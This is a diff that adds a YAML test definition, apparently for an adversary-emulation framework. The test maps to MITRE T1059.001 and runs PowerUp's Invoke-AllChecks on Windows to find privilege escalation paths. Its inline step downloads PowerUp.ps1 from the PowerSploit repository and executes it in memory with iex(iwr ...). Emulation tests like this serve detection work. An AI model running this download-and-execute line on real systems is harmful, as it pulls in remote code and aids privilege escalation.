@@ -1,0 +1,25 @@
+api_version: "2.0"
+name: PowerUp Invoke-AllChecks
+description: |
+    Check for privilege escalation paths using PowerUp from PowerShellMafia
+uuid: 1289f78d-22d2-4590-ac76-166737e1811b
+mitre:
+    tactics:
+        - 'TA0002: Execution'
+    techniques:
+        - 'T1059: Command and Scripting Interpreter'
+    subtechniques:
+        - 'T1059.001: PowerShell'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: powerup-invoke-allchecks
+      inline: |
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)
+        Invoke-AllChecks
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
